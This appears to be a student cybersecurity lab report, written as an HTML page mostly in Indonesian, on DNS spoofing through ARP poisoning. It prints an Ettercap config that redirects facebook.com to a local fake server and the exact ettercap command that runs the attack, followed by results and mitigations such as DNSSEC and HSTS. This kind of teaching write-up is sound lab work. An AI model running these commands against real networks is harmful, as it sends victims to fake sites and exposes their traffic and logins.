@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>DNS Spoofing – MITM Attack Analysis</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+
+  <style>
+    body {
+      background: #0f172a;
+      color: #cbd5e1;
+      font-family: 'Segoe UI', Arial, sans-serif;
+    }
+    h1, h2 {
+      color: #38bdf8;
+    }
+    .section {
+      background: #172133;
+      padding: 2em;
+      margin-bottom: 2em;
+      border-radius: 14px;
+      border: 1px solid #23314d;
+    }
+    pre {
+      background: #1e293b;
+      color: #a5f3fc;
+      padding: 1em;
+      border-radius: 8px;
+      white-space: pre-wrap;
+    }
+    .footer {
+      text-align: center;
+      opacity: 0.6;
+      margin-top: 3em;
+    }
+  </style>
+</head>
+
+<body>
+<div class="container">
+
+  <h1 class="text-center mt-5 mb-3">
+    DNS Spoofing – Man-in-the-Middle Attack
+  </h1>
+  <p class="text-center">
+    Experimenter: Toki<br>
+    Environment: Kali Linux<br>
+    Date: 7 November 2025
+  </p>
+
+  <div class="section">
+    <h2>1. Pendahuluan</h2>
+    <p>
+      DNS Spoofing adalah teknik serangan yang memanipulasi resolusi DNS
+      agar korban diarahkan ke situs palsu. Teknik ini umumnya dikombinasikan
+      dengan ARP Spoofing untuk mencapai posisi Man-in-the-Middle (MITM).
+    </p>
+  </div>
+
+  <div class="section">
+    <h2>2. Tujuan Praktikum</h2>
+    <ul>
+      <li>Memahami konsep DNS Spoofing</li>
+      <li>Mengonfigurasi file DNS spoof Ettercap</li>
+      <li>Menguji pengalihan domain ke server palsu</li>
+      <li>Menganalisis risiko keamanan DNS</li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <h2>3. Konfigurasi DNS Spoofing</h2>
+    <pre>
+sudo nano /etc/ettercap/etter.dns
+
+www.facebook.com   A   192.168.1.50
+*.facebook.com     A   192.168.1.50
+    </pre>
+  </div>
+
+  <div class="section">
+    <h2>4. Menjalankan DNS Spoofing</h2>
+    <pre>
+sudo ettercap -T -q -M arp -i wlan0 -P dns_spoof
+    </pre>
+  </div>
+
+  <div class="section">
+    <h2>5. Hasil Pengujian</h2>
+    <ul>
+      <li>Resolusi DNS berhasil dimanipulasi</li>
+      <li>Korban diarahkan ke server palsu</li>
+      <li>Lalu lintas dapat dianalisis</li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <h2>6. Analisis Keamanan</h2>
+    <p>
+      DNS Spoofing mengekspos kelemahan DNS tanpa validasi.
+      Tanpa DNSSEC dan HTTPS enforcement, pengguna sangat rentan.
+    </p>
+  </div>
+
+  <div class="section">
+    <h2>7. Mitigasi</h2>
+    <ul>
+      <li>DNSSEC</li>
+      <li>HTTPS & HSTS</li>
+      <li>VPN</li>
+      <li>IDS/IPS</li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <h2>8. Kesimpulan</h2>
+    <p>
+      DNS Spoofing dapat dilakukan dengan mudah ketika penyerang berada
+      di posisi MITM. Kesadaran keamanan DNS sangat krusial.
+    </p>
+    <p><b>Status:</b> Completed ✅</p>
+  </div>
+
+  <div class="footer">
+    DNS Spoofing Experiment — Cybersecurity Lab
+  </div>
+
+</div>
+</body>
+</html>
